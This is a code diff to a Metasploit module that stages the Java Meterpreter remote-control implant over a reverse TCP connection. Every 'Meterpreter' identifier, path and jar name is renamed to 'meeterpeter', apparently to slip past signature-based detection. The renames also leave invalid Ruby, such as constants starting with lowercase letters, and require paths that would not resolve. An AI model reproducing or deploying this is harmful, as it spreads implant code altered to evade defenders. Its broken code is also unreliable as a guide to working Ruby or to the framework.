@@ -6,20 +6,20 @@
 require 'msf/core'
 require 'msf/core/payload/java'
 require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/meterpreter_java'
-require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/meeterpeter_java'
+require 'msf/base/sessions/meeterpeter_options'
 
 
 module Metasploit3
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::meeterpeterOptions
 
   # The stager should have already included this
   #include Msf::Payload::Java
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Java Meterpreter',
-      'Description'   => 'Run a meterpreter server in Java',
+      'Name'          => 'Java meeterpeter',
+      'Description'   => 'Run a meeterpeter server in Java',
       'Author'        => [
           'mihi', # all the hard work
           'egypt' # msf integration
@@ -31,21 +31,21 @@ module Metasploit3
           'Convention' => 'javasocket javaurl',
         },
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_Java_Java))
+      'Session'       => Msf::Sessions::meeterpeter_Java_Java))
     # Order matters.  Classes can only reference classes that have already
     # been sent.  The last .class must implement Stage, i.e. have a start()
     # method.
     #
-    # The Meterpreter.class stage is just a jar loader, not really anything
-    # to do with meterpreter specifically.  This payload should eventually
-    # be replaced with an actual meterpreter stage so we don't have to send
+    # The meeterpeter.class stage is just a jar loader, not really anything
+    # to do with meeterpeter specifically.  This payload should eventually
+    # be replaced with an actual meeterpeter stage so we don't have to send
     # a second jar.
     @stage_class_files = [
       [ "javapayload", "stage", "Stage.class" ],
-      [ "com", "metasploit", "meterpreter", "MemoryBufferURLConnection.class" ],
-      [ "com", "metasploit", "meterpreter", "MemoryBufferURLStreamHandler.class" ],
+      [ "com", "metasploit", "meeterpeter", "MemoryBufferURLConnection.class" ],
+      [ "com", "metasploit", "meeterpeter", "MemoryBufferURLStreamHandler.class" ],
       # Must be last!
-      [ "javapayload", "stage", "Meterpreter.class" ],
+      [ "javapayload", "stage", "meeterpeter.class" ],
     ]
   end
 
@@ -55,7 +55,7 @@ module Metasploit3
   #
   def generate_stage(opts={})
     # TODO: wire the UUID into the stage
-    met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
+    met = MetasploitPayloads.read('meeterpeter', 'meeterpeter.jar')
 
     # All of the dendencies to create a jar loader, followed by the length
     # of the jar and the jar itself.
